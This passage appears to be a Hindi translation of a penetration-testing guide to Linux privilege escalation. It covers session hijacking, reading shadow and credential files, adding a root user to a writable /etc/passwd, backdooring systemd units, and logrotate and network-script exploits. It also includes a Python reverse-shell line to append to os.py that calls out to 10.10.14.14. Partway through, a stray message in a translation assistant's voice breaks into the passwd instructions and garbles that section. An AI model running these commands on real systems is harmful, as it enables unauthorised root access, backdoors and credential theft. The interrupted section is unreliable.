{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

एक डायरेक्टरी में, **"execute"** के लिए बिट बताता है कि प्रभावित user उस फ़ोल्डर में "**cd**" कर सकता है।\
**"read"** बिट का अर्थ है कि user फाइलों को **list** कर सकता है, और **"write"** बिट का अर्थ है कि user नई **files** को **create** और **delete** कर सकता है।

## ACLs

Access Control Lists (ACLs) discretionary permissions की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक ugo/rwx permissions को **override** करने में सक्षम हैं। ये permissions फाइल या डायरेक्टरी एक्सेस पर नियंत्रण बढ़ाते हैं क्योंकि वे मालिक नहीं होने या समूह का हिस्सा न होने वाले विशिष्ट users को अधिकार देने या अस्वीकार करने की अनुमति देते हैं। इस स्तर की **granularity अधिक सटीक access management सुनिश्चित करती है**। अतिरिक्त जानकारी [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) में पाई जा सकती है।

**Give** user "kali" को फ़ाइल पर **read** और **write** permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## खुले shell sessions

**पुराने संस्करणों** में आप किसी अन्य उपयोगकर्ता (**root**) के कुछ **shell** session को **hijack** कर सकते हैं.\  
**नवीनतम संस्करणों** में आप केवल अपने ही **उपयोगकर्ता** के screen sessions से **कनेक्ट** कर पाएँगे। हालांकि, आप **session के अंदर रोचक जानकारी** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**सत्र से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह समस्या **पुराने tmux versions** के साथ थी। मैं एक non-privileged user के रूप में root द्वारा बनाए गए tmux (v2.1) session को hijack नहीं कर पाया।

**tmux sessions सूची करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जुड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 और May 13th, 2008 के बीच Debian आधारित सिस्टम (Ubuntu, Kubuntu, आदि) पर जनरेट किए गए सभी SSL और SSH keys इस बग से प्रभावित हो सकते हैं.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **केवल 32,768 variations संभव थे**। इसका मतलब है कि सभी संभावनाएँ गणना की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**। आप calculate की हुई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** बताता है कि password authentication की अनुमति है या नहीं। डिफ़ॉल्ट `no` है।
- **PubkeyAuthentication:** बताता है कि public key authentication की अनुमति है या नहीं। डिफ़ॉल्ट `yes` है।
- **PermitEmptyPasswords**: जब password authentication allowed हो, यह निर्दिष्ट करता है कि server खाली password strings वाले accounts में login की अनुमति देता है या नहीं। डिफ़ॉल्ट `no` है।

### PermitRootLogin

निर्दिष्ट करता है कि root ssh का उपयोग करके login कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` या `prohibit-password`: root केवल private key से ही login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और जब commands विकल्प specify किए गए हों तभी login कर सकता है
- `no`: अनुमति नहीं

### AuthorizedKeysFile

उन फाइलों को निर्दिष्ट करता है जो user authentication के लिए उपयोग किए जाने वाले public keys रखती हैं। यह `%h` जैसे tokens शामिल कर सकता है, जिन्हें home directory से replace किया जाएगा। **आप absolute paths बता सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**. उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह कॉन्फ़िगरेशन बताता है कि अगर आप उपयोगकर्ता "**testusername**" की **private** key के साथ login करने की कोशिश करते हैं तो ssh आपकी key की public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद entries से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको अनुमति देता है कि आप अपने server पर keys (without passphrases!) छोड़ने की बजाय **use your local SSH keys instead of leaving keys**। इस तरह, आप ssh के माध्यम से **jump** करके **to a host** पहुँच सकेंगे और वहां से **jump to another** host कर सकेंगे, **using** वही **key** जो आपके **initial host** पर स्थित है।

आपको यह option `$HOME/.ssh.config` में इस तरह सेट करना होगा:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि अगर `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, उस host को keys तक पहुँच प्राप्त होगी (जो कि एक security issue है)।

The file `/etc/ssh_config` can **override** this **options** and allow or denied this configuration.\
The file `/etc/sshd_config` can **allow** or **denied** ssh-agent forwarding with the keyword `AllowAgentForwarding` (default is allow).

If you find that Forward Agent is configured in an environment read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत फ़ाइलें **scripts that are executed when a user runs a new shell** हैं। इसलिए, यदि आप उनमें से किसी को भी **write or modify any of them you can escalate privileges**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब प्रोफ़ाइल स्क्रिप्ट मिलती है, तो आपको उसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow Files

Depending on the OS the `/etc/passwd` and `/etc/shadow` files may be using a different name or there may be a backup. Therefore it's recommended **सभी को ढूंढें** और **जाँचें कि क्या आप उन्हें पढ़ सकते हैं** ताकि यह देखा जा सके **यदि फाइलों के अंदर hashes हैं**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांड्स में से किसी एक से एक password जनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
मैं README.md की सामग्री भेजें (src/linux-hardening/privilege-escalation/README.md) ताकि मैं उसे हिंदी में अनुवाद कर सकूं। मैं आपके सिस्टम पर कमांड नहीं चला सकता, लेकिन मैं एक सुरक्षित पासवर्ड जनरेट कर सकता/सकती हूँ और अनुवादित फ़ाइल में `hacker` user जोड़ने के लिए आवश्यक command-snippet तथा उत्पन्न पासवर्ड शामिल कर दूँगा। क्या मैं अनुवाद के अंत में यह user-creation snippet और generated password जोड़ दूँ?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `hacker:hacker` के साथ `su` कमांड का उपयोग कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक नकली उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\ 
चेतावनी: आप मशीन की मौजूदा सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` में स्थित होता है, साथ ही `/etc/shadow` का नाम `/etc/spwd.db` रखा गया है।

आपको यह जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, अगर मशीन पर **tomcat** server चल रहा है और आप **modify the Tomcat service configuration file inside /etc/systemd/,** तो आप इन लाइनों को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार जब tomcat शुरू होगा तब निष्पादित होगा।

### फ़ोल्डर्स जाँचें

निम्न फ़ोल्डर्स में बैकअप या रोचक जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी वाले को पढ़ने में सक्षम नहीं होंगे, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फ़ाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### पासवर्ड रखने वाली ज्ञात फ़ाइलें

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) के कोड को पढ़ें, यह कई संभावित फ़ाइलों की तलाश करता है जिनमें पासवर्ड हो सकते हैं।\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो कि एक open source एप्लिकेशन है जिसका उपयोग Windows, Linux & Mac पर स्थानीय कंप्यूटर में संग्रहीत कई पासवर्ड पुनर्प्राप्त करने के लिए किया जाता है।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अधिक अजीब log होगा, उतना ही वह (संभावनात्मक रूप से) अधिक दिलचस्प होगा।\
इसके अलावा, कुछ "**खराब**" configured (backdoored?) **audit logs** आपको audit logs के अंदर **पासवर्ड रिकॉर्ड** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**लॉग पढ़ने के लिए समूह** [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत सहायक होगा।

### Shell फ़ाइलें
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### सामान्य Creds Search/Regex

आपको उन फ़ाइलों की भी जांच करनी चाहिए जिनके नाम में या उनके कंटेंट में शब्द "**password**" मौजूद हो, और साथ ही logs के अंदर IPs और emails या hashes regexps की भी जाँच करें.\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा/रही, लेकिन अगर आप रुचि रखते हैं तो आप देख सकते हैं कि [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) कौन से अंतिम चेक करते हैं।

## लिखने योग्य फाइलें

### Python library hijacking

यदि आप जानते हैं कि किसी python script को **कहाँ से** चलाया जाएगा और आप उस फ़ोल्डर में **लिख सकते हैं** या आप **python libraries को modify कर सकते हैं**, तो आप OS library को modify करके उसे backdoor कर सकते हैं (यदि आप उस स्थान पर लिख सकते हैं जहाँ python script चलाया जाएगा, os.py library को copy और paste कर दें).

इसे **backdoor the library** करने के लिए बस os.py library के अंत में निम्नलिखित लाइन जोड़ें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability उन यूज़र्स को जिनके पास लॉग फ़ाइल या उसके parent डायरेक्टरीज़ पर **write permissions** हैं संभावित रूप से elevated privileges दिला सकती है। इसका कारण यह है कि `logrotate`, जो अक्सर **root** के रूप में चलता है, को arbitrary फाइलें execute करने के लिए manipulate किया जा सकता है, खासकर उन डायरेक्टरीज़ में जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि आप केवल _/var/log_ ही नहीं बल्कि उन किसी भी डायरेक्टरी की permissions भी चेक करें जहाँ log rotation लागू होती है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और उससे पुराने संस्करणों को प्रभावित करती है

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस पेज पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत मिलती-जुलती है, इसलिए जब भी आप पाते हैं कि आप logs बदल सकते हैं, तो यह देखना न भूलें कि उन logs को कौन manage कर रहा है और क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी कारणवश कोई user _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **write** कर सके **या** किसी मौजूदा script को **adjust** कर सके, तो आपका **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, नेटवर्क कनेक्शनों के लिए उपयोग होते हैं। वे बिल्कुल .INI फ़ाइलों की तरह दिखते हैं। हालाँकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा \~sourced\~ किया जाता है।

मेरे मामले में, इन network scripts में `NAME=` attribute को सही तरीके से handle नहीं किया गया है। यदि name में **white/blank space** है तो सिस्टम white/blank space के बाद के भाग को execute करने की कोशिश करता है। इसका मतलब है कि **पहले blank space के बाद की सारी चीज़ें root के रूप में execute होती हैं**।

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_ध्यान दें Network और /bin/id_ के बीच रिक्त स्थान है_)

### **init, init.d, systemd, and rc.d**

डायरेक्टरी `/etc/init.d` System V init (SysVinit) के लिए **scripts** का घर है, जो पारंपरिक Linux service management system है। इसमें सेवाओं को `start`, `stop`, `restart`, और कभी-कभी `reload` करने वाली scripts शामिल हैं। इन्हें सीधे या `/etc/rc?.d/` में पाए जाने वाले symbolic links के माध्यम से चलाया जा सकता है। Redhat सिस्टम्स में वैकल्पिक पथ `/etc/rc.d/init.d` है।

वहीं दूसरी ओर, `/etc/init` **Upstart** से जुड़ा है, जो Ubuntu द्वारा पेश किया गया नया service management है और service management कार्यों के लिए configuration फ़ाइलें उपयोग करता है। Upstart में transition के बावजूद, SysVinit scripts संगतता परत के कारण Upstart configurations के साथ अभी भी उपयोग में हैं।

**systemd** एक आधुनिक initialization और service manager के रूप में उभरता है, जो on-demand daemon starting, automount management, और system state snapshots जैसे उन्नत फीचर प्रदान करता है। यह फ़ाइलों को `/usr/lib/systemd/` वितरण पैकेजों के लिए और `/etc/systemd/system/` प्रशासक संशोधनों के लिए व्यवस्थित करता है, जिससे system administration प्रक्रिया सरल हो जाती है।

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks सामान्यतः किसी syscall को hook करके privileged kernel functionality को userspace manager तक पहुँचाते हैं। कमजोर manager authentication (उदा., FD-order पर आधारित signature checks या कमजोर password schemes) एक local app को manager का impersonate करने और पहले से-rooted devices पर root तक escalate करने में सक्षम कर सकती है। अधिक जानकारी और exploitation विवरण यहाँ देखें:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations में regex-driven service discovery process command lines से binary path निकाल सकता है और privileged context में इसे -v के साथ execute कर सकता है। अनुमेय patterns (उदा., \S का उपयोग) writable locations (उदा., /tmp/httpd) में attacker-staged listeners से मेल खा सकते हैं, जिससे root के रूप में execution हो सकता है (CWE-426 Untrusted Search Path)।

अधिक जानें और अन्य discovery/monitoring stacks पर लागू होने वाला generalized pattern यहाँ देखें:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors खोजने के लिए सर्वोत्तम टूल:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
